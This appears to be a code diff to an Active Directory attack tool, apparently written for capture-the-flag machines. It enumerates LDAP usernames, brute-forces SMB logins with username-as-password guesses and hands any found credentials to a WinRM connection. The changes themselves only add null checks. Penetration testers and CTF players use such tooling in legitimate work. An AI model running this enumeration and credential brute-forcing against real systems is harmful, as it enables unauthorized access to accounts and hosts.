@@ -57,10 +57,13 @@ class LdapEnum:
                 users_list = []
                 user_obj = self.ldapper.get_all_users()
                 with open(c.getPath("wordlists", "ldapUsernames"), "w+") as userlist_file:
-                    for user in user_obj:
-                        users_list.append(user['sAMAccountName'])
-                        userlist_file.write(user['sAMAccountName'] + "\n")
-                return users_list
+                    if user_obj:
+                        for user in user_obj:
+                            users_list.append(user['sAMAccountName'])
+                            userlist_file.write(user['sAMAccountName'] + "\n")
+                        return users_list
+                    else:
+                        return None
 
             def check_parse_hashes():
                 print(f"[{fg.li_magenta}+{fg.rs}] Creating List of Valid Usernames")
@@ -117,16 +120,18 @@ class LdapEnum:
             def check_auth(creds=None):
                 valid_creds = []
                 print(f"[{fg.li_magenta}+{fg.rs}] Brute-Forcing found usernames over SMB")
-                for user in parse_users():
-                    try:
-                        smb = SMBConnection(self.target, self.target)
-                        test_login = smb.login(user, creds if creds is not None else user)
-                    except SessionError:
-                        test_login = False
-                        print(f"Testing valid login: {user}:{creds if creds is not None else user} True or False? {fg.red}{test_login}{fg.rs}")
-                    if test_login is True:
-                        valid_creds.append(user)
-                        print(f"\n[{fg.li_green}+{fg.rs}] Valid Credentials Found! {fg.li_green}{user}{fg.rs}:{fg.li_green}{creds if creds is not None else user}{fg.rs}\n")
+                users = parse_users()
+                if users:
+                    for user in users:
+                        try:
+                            smb = SMBConnection(self.target, self.target)
+                            test_login = smb.login(user, creds if creds is not None else user)
+                        except SessionError:
+                            test_login = False
+                            print(f"Testing valid login: {user}:{creds if creds is not None else user} True or False? {fg.red}{test_login}{fg.rs}")
+                        if test_login is True:
+                            valid_creds.append(user)
+                            print(f"\n[{fg.li_green}+{fg.rs}] Valid Credentials Found! {fg.li_green}{user}{fg.rs}:{fg.li_green}{creds if creds is not None else user}{fg.rs}\n")
                 return valid_creds
 
             def query_disp_info():
@@ -233,6 +238,7 @@ class LdapEnum:
                             monteverde(valid_password[0])
                     else:
                         creds_ = check_possible_creds()
-                        winrm_connect(creds_[0], creds_[1])
+                        if creds_:
+                            winrm_connect(creds_[0], creds_[1])
 
             checkWinRm()
